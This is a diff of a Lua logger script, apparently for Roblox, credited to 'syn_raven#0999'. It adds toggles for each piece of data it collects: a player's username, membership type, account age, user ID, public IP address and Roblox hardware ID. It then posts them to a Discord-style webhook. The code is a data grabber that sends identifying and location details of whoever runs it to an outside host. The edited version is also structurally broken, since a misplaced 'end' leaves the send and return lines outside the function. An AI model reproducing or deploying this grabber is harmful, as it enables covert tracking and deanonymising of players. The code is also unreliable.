@@ -1,6 +1,12 @@
 ---@diagnostic disable: undefined-global
 local logscript = {
-  Webhook = nil
+  Webhook = nil,
+  Username = true,
+  MembershipType = true,
+  AccountAge = true,
+  UserID = true,
+  IPAddress = true,
+  RobloxHWID = true,
 }
 
 
@@ -44,38 +50,7 @@ function logscript:Load()
             ["url"] = "https://ipapi.co/?q="..IPv4,
             ["description"] = "```diff\n".."+ by syn_raven#0999".."\n```",
             ["color"] = tonumber(0xffffff),
-            ["fields"] = {
-              {
-                ["name"] = "Username:",
-                ["value"] = "["..PlayerName.."](https://www.roblox.com/users/"..UserId.."/profile)",
-                ["inline"] = true
-          },
-                {
-                    ["name"] = "Membership Type:",
-                    ["value"] = MembershipType,
-                    ["inline"] = true
-  },
-                {
-                    ["name"] = "Account Age:",
-                    ["value"] = AccountAge.. " days",
-                    ["inline"] = true
-  },
-                {
-                    ["name"] = "User ID:",
-                    ["value"] = UserId,
-                    ["inline"] = true
-  },
-                {
-                    ["name"] = "Public IP Address:",
-                    ["value"] = IPv4,
-                    ["inline"] = true
-                },
-                {
-                  ["name"] = "Roblox HWID:",
-                  ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
-                  ["inline"] = true
-            },
-            },
+            ["fields"] = {},
             ["thumbnail"] = {
               ["url"] = imageUrl
             },
@@ -85,9 +60,63 @@ function logscript:Load()
         }}
     }
 
+    if logscript.Username then
+      table.insert(PlayerData["embeds"][1]["fields"], {
+        ["name"] = "Username:",
+        ["value"] = "["..PlayerName.."](https://www.roblox.com/users/"..UserId.."/profile)",
+        ["inline"] = true
+      })
+    end
+
+    if logscript.MembershipType then
+      table.insert(PlayerData["embeds"][1]["fields"], {
+        ["name"] = "Membership Type:",
+        ["value"] = MembershipType,
+        ["inline"] = true
+      })
+    end
+
+    if logscript.AccountAge then
+      table.insert(PlayerData["embeds"][1]["fields"], {
+        ["name"] = "Account Age:",
+        ["value"] = AccountAge.. " days",
+        ["inline"] = true
+      })
+    end
+
+
+    if logscript.UserID then
+      table.insert(PlayerData["embeds"][1]["fields"], {
+        ["name"] = "User ID:",
+        ["value"] = UserId,
+        ["inline"] = true
+      })
+    end
+
+
+    if logscript.IPAddress then
+      table.insert(PlayerData["embeds"][1]["fields"], {
+        ["name"] = "Public IP Address:",
+        ["value"] = IPv4,
+        ["inline"] = true
+      })
+    end
+
+    if logscript.RobloxHWID then
+      table.insert(PlayerData["embeds"][1]["fields"], {
+        ["name"] = "Roblox HWID:",
+        ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+        ["inline"] = true
+      })
+    end
+end
+
+    
+
   local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
 
   HttpRequest({Url=logscript.Webhook, Body=PlayerData, Method="POST", Headers=Headers})
-end
 
-return logscript
+  return logscript
+
+
